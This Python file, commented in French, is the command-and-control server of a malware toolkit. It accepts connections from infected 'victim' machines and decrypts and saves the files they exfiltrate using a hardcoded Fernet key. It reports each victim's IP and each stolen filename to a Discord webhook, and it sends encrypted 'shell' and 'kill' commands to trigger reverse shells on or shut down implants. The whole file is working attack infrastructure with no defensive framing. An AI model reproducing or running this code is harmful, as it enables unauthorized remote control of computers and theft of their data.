import socket
from cryptography.fernet import Fernet
import os
import threading
import sys
import psutil
import time
import requests

tab_socket = [] # liste qui contiendra les connexions des clients

"""
fonction qui envoie un message au bot discord
"""
def send_message_bot(message):
    url ="" # url du webhook discord
    data = {"text": message} # message à envoyer
    requests.post(url, json=data) 

"""
fonction qui gère les clients connectés au serveur
"""

def handle_client(conn, cipher_suite):
    try:
        tabData = [] # liste qui contiendra les données reçues
        while True:
            print("Waiting for data...")
            data = conn.recv(5000) # réception des données
            if not data:
                break # si les données sont vides, on sort de la boucle
            decrypted_data = cipher_suite.decrypt(data).decode("utf-8") # déchiffrement des données
            print(decrypted_data) 
            tabData.append(decrypted_data) # ajout des données à la liste
            if len(tabData) == 2: # si la liste contient 2 éléments
                filename = tabData[0] # le premier élément est le nom du fichier
                with open("./files/" + filename, 'a+') as file:
                    file.write(tabData[1]) # le deuxième élément est le contenu du fichier
                tabData = [] # on vide la liste
                send_message_bot(f"{filename}") # envoi du nom du fichier au bot discord
                conn.close() # fermeture de la connexion
                break # sortie de la boucle
    except Exception as e:
        print(f"Error: {e}")


"""
fonction qui vérifie si les sockets sont actives ou non
"""

def socket_alive(tab_socket):
    for conn in tab_socket: # pour chaque connexion dans la liste
        try:
            conn['conn'].getpeername()  # on vérifie si la connexion est active
        except Exception as e:
            tab_socket.remove(conn) # si la connexion n'est pas active, on la supprime de la liste
    return bool(tab_socket) # on retourne True si la liste n'est pas vide, False sinon

"""
fonction qui arrête le processus en cours
"""

def clean():
    psutil.Process(get_pid()).terminate()  
    
"""
fonction qui récupère le pid du processus en cours dans un fichier, il sera utilisé pour le kill
"""

def get_pid():
    with open('serverpid.txt','r') as file:
        pid = file.read()
    return int(pid)

"""
fonction qui écrit le pid du processus en cours dans un fichier
"""

def write_pid():
    with open('serverpid.txt','w') as file:
        file.write(str(os.getpid()))


"""
fonction qui crée un fichier kill.txt pour arrêter tous les serveurs
"""

def kill_all_servers():

    with open('kill.txt', 'w+') as file:
        file.write("kill")  
        


"""
fonction qui vérifie si le fichier kill.txt existe et si les sockets sont actives
"""

def verify_kill():
        while True:
            try:
                if os.path.exists('kill.txt') and socket_alive(tab_socket):
                    send_kill_message(tab_socket) # envoi du message kill à toutes les connexions actives
                    time.sleep(5) # attente de 5 secondes
                    clean() # arrêt du processus
                if os.path.exists('kill.txt') and socket_alive(tab_socket) == False:
                    clean() # arrêt du processus si les sockets ne sont pas actives
            except KeyboardInterrupt:
                clean() # arrêt du processus en cas d'interruption avec un contrôle-c


"""
fonction qui envoie le message kill à toutes les connexions actives
"""

def send_kill_message(tab_socket):
    if not tab_socket: # si la liste est vide
        print("No active connections to send kill message to.") 
        return 
    
    key = "Y7AYXeoiELaca2QtHeTubSGmbTOu27QyYin2f-Wfr3s=" # clé de chiffrement et de déchiffrement
    message = "kill" # message à envoyer
    print("Sending kill message to all clients...")
    for socket in tab_socket: # pour chaque connexion dans la liste
        encrypted_message = Fernet(key).encrypt(message.encode('utf-8')) # chiffrement du message
        socket['conn'].send(encrypted_message) # envoi du message
    
    tab_socket.clear() # on vide la liste

            
"""
fonction qui vérifie si le fichier command.txt existe et exécute la commande correspondante 
"""


def verify_command():
    while True:
        try:
            if os.path.exists('command.txt'): # si le fichier command.txt existe
                with open('command.txt', 'r') as file:
                    content = file.read() # lecture du fichier
                    content = content.split('.') # séparation du contenu
                    if len(content) == 2:
                        launch_command(content[0], content[1]) # exécution de la commande
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(1)  # attente de 1 seconde pour éviter de surcharger le processeur
        




"""
fonction qui crée un fichier avec l'id de la victime pour lancer un reverse shell
"""

def reverse_shell(victim):
    with open('command.txt', 'w+') as file:
        file.write(f'{str(victim)}.shell') 
        
"""
fonction qui envoie le message shell au client spécifié, pour lancer un reverse shell
"""
    
def launch_command(socket, shell):
    os.remove('command.txt') # suppression du fichier command.txt
    key = "Y7AYXeoiELaca2QtHeTubSGmbTOu27QyYin2f-Wfr3s=" # clé de chiffrement et de déchiffrement
    socket = tab_socket[int(socket)]['conn'] # récupération de la connexion du client
    encrypted_message = Fernet(key).encrypt(shell.encode('utf-8'))    # chiffrement du message
    socket.send(encrypted_message) # envoi du message



"""
fonction qui affiche les connexions actives 
"""

def list_target():
    print("Targets:")
    with open('socket.txt', 'r') as file:
        print(file.read())  

"""
fonction qui lit le fichier spécifié
"""

def readfile(option):
    filename = option
    try:
        with open("./files/"+filename, 'r') as file:
            print(file.read()) 
    except FileNotFoundError:
        print(f"File {filename} does not exist on the server.") 


"""
fonction qui écoute sur le port spécifié 
"""

def listen(option):
    port = option
    server_conn("ip_server", port) # lancement du serveur


"""
fonction qui affiche les fichiers sur le serveur
"""

def show():
    files = os.listdir("./files/") # liste des fichiers dans le dossier files
    print("Files on the server:") 
    for file in files:
        print(file)


"""
fonction qui gère les connexions des clients au serveur 
"""
def server_conn(server_address, server_port):
    id=0 # id de la connexion
    write_pid() # écriture du pid du processus en cours dans un fichier
    key = "Y7AYXeoiELaca2QtHeTubSGmbTOu27QyYin2f-Wfr3s=" # clé de chiffrement et de déchiffrement
    cipher_suite = Fernet(key) # création d'une instance de la classe Fernet
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # création d'un socket
    server_socket.bind((server_address, server_port)) # liaison du socket à l'adresse et au port
    server_socket.listen(5) # le serveur écoute les connexions entrantes
    print("Server is listening...") 

    while True:
        dict_socket = {} # dictionnaire qui contiendra la connexion et l'adresse du client
        conn, address_client = server_socket.accept() # acceptation de la connexion
        dict_socket['conn'] = conn # ajout de la connexion au dictionnaire
        dict_socket['address_client'] = address_client # ajout de l'adresse du client au dictionnaire
        with open('socket.txt', 'a+') as file: 
            file.write(f"{id}. connection: {dict_socket['address_client']}\n") # écriture de l'adresse du client dans un fichier
        id += 1 # incrémentation de l'id
        tab_socket.append(dict_socket) # ajout du dictionnaire à la liste
        print("Waiting for data...")
        print(f"New connection from {address_client}")
        send_message_bot(f"ip {address_client}") # envoi de l'adresse du client au bot discord 
        server_thread = threading.Thread(target=handle_client, args=(conn, cipher_suite)) # création d'un thread pour gérer la connexion du client 
        verify_command_thread = threading.Thread(target=verify_command) # création d'un thread pour vérifier si le fichier command.txt existe si oui exécute la commande pour le reverse shell
        verify_kill_thread = threading.Thread(target=verify_kill) # création d'un thread pour vérifier si le fichier kill.txt existe si oui envoi le message kill à toutes les connexions actives

        server_thread.start() # démarrage du thread
        verify_command_thread.start()
        verify_kill_thread.start() 
